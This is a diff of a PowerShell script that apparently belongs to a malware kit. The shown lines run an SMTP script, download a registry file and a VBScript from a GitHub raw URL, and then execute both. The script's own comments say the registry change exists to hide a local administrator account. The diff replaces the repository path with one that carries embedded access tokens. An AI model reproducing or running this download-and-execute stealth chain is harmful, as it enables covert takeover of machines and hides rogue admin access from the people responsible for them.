@@ -43,10 +43,10 @@ cd $path
 ./smtp.ps1
 
 #registry to hide local admin
-Invoke-WebRequest -Uri raw.githubusercontent.com/m98m98/ttaarr/refs/heads/main/wrev.reg -Outfile "wrev.reg"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/m98m98/tar2/refs/heads/main/wrev.reg?token=GHSAT0AAAAAAC7AO3Q3L2TPI4F4AM7RI46AZ5SQATQ -Outfile "wrev.reg"
 
 # visual basic script to register the registry
-Invoke-WebRequest -Uri raw.githubusercontent.com/m98m98/ttaarr/refs/heads/main/calty.vbs -Outfile "calty.vbs"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/m98m98/tar2/refs/heads/main/calty.vbs?token=GHSAT0AAAAAAC7AO3Q232F7FQZY4Q5WZKKIZ5SQAZA -Outfile "calty.vbs"
 
 #install the registry
 ./wrev.reg; ./calty
